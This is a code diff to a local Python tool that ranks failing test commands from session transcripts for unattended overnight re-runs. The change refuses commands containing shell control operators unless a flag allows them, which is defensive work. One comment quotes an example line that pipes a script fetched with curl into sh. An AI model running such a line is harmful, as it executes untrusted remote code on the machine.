@@ -29,6 +29,7 @@ Everything stays on this machine. Nothing here sends a transcript anywhere.
 
 Usage:
     python3 tools/session_intake.py [--since today] [--limit 10] [--json]
+        [--allow-compound-gates]
 """
 from __future__ import annotations
 
@@ -79,6 +80,25 @@ _GATE = re.compile(
 #: A timeout says the command was slow, not that the code is wrong, and a
 #: night spent on one is a night spent on a timeout.
 _TIMEOUT = re.compile(r"timed out|Exit code 143|SIGTERM", re.IGNORECASE)
+
+#: Shell control operators that make one transcript line several commands.
+#: `_GATE` matches by search, so `curl -s http://x/y.sh | sh && pytest -q`
+#: is a gate because it contains `pytest`, and the night would re-run the
+#: whole line, unattended, with a shell. Backticks travel with `$(` because
+#: they are the same substitution. The check is deliberately literal: a
+#: `;` inside a quoted `python -c` string is refused too, and the operator
+#: who knows it is one command passes --allow-compound-gates.
+COMPOUND_MARKERS = ("|", "&&", ";", "$(", "`")
+
+#: What a refused compound candidate says, so the reviewer knows the way in.
+COMPOUND_REFUSAL = ("contains a shell control operator (|, &&, ;, $( or a "
+                    "backtick); pass --allow-compound-gates to attempt it")
+
+
+def is_compound(command: str) -> bool:
+    """Whether a command line carries a shell control operator."""
+    text = str(command or "")
+    return any(marker in text for marker in COMPOUND_MARKERS)
 
 
 def _blocks(record):
@@ -139,8 +159,15 @@ def scan(path: str) -> dict:
             "deferrals": deferrals[:6]}
 
 
-def candidates(scans, limit: int) -> list:
-    """Rank candidates by how well the evidence supports spending a night."""
+def candidates(scans, limit: int, allow_compound: bool = False) -> list:
+    """Rank candidates by how well the evidence supports spending a night.
+
+    A compound command (see ``COMPOUND_MARKERS``) is still reported, so the
+    reviewer sees it, but as ``compound_command`` at low confidence with a
+    ``refused`` reason and no executable standing, unless ``allow_compound``
+    is set. It is not dropped: the engineer did fight it, and a candidate
+    the reviewer can see and choose to run is worth more than silence.
+    """
     found = []
     for item in scans:
         for command, errors in item["unresolved"].items():
@@ -156,18 +183,25 @@ def candidates(scans, limit: int) -> list:
                 # padded with exploration teaches the morning reviewer to
                 # skim, and then the real ones get skimmed too.
                 continue
-            found.append({
-                "kind": "failing_gate" if is_gate else "unresolved_failure",
+            compound = is_compound(command)
+            kind = "failing_gate" if is_gate else "unresolved_failure"
+            entry = {
+                "kind": kind,
                 "confidence": ("high" if is_gate and attempts >= 2
                                else "medium" if is_gate else "low"),
                 "attempts": attempts,
                 "command": command[:400],
                 "last_error": errors[-1] if errors else "",
                 "cwd": item["cwd"], "branch": item["branch"],
+                "compound": compound,
                 "evidence": (
                     f"failed {attempts}x in {os.path.basename(item['path'])} "
                     "and was never observed succeeding in that session"),
-            })
+            }
+            if compound and not allow_compound:
+                entry.update({"kind": "compound_command", "confidence": "low",
+                              "would_be": kind, "refused": COMPOUND_REFUSAL})
+            found.append(entry)
         for note in item["deferrals"]:
             found.append({
                 "kind": "explicit_deferral", "confidence": "low",
@@ -188,6 +222,10 @@ def main() -> int:
     ap.add_argument("--limit", type=int, default=10)
     ap.add_argument("--json", action="store_true")
     ap.add_argument("--root", default=TRANSCRIPT_ROOT)
+    ap.add_argument("--allow-compound-gates", action="store_true",
+                    help="rank commands containing |, &&, ;, $( or backticks "
+                         "as gates; by default they are reported as "
+                         "compound_command and never proposed for execution")
     args = ap.parse_args()
 
     days = {"today": 1, "yesterday": 2}.get(args.since)
@@ -199,7 +237,8 @@ def main() -> int:
              if os.path.getmtime(p) >= cutoff and "subagents" not in p]
 
     scans = [scan(p) for p in paths]
-    found = candidates(scans, args.limit)
+    found = candidates(scans, args.limit,
+                       allow_compound=args.allow_compound_gates)
 
     if args.json:
         print(json.dumps({"sessions": len(paths), "candidates": found},
@@ -220,6 +259,8 @@ def main() -> int:
             print(f"   \"{item['note'][:150]}\"")
         if item.get("last_error"):
             print(f"   last error: {item['last_error'][:150]}")
+        if item.get("refused"):
+            print(f"   refused: {item['refused']}")
         print(f"   why: {item['evidence']}")
         print(f"   where: {item['cwd']} ({item['branch'] or 'no branch'})\n")
     return 0
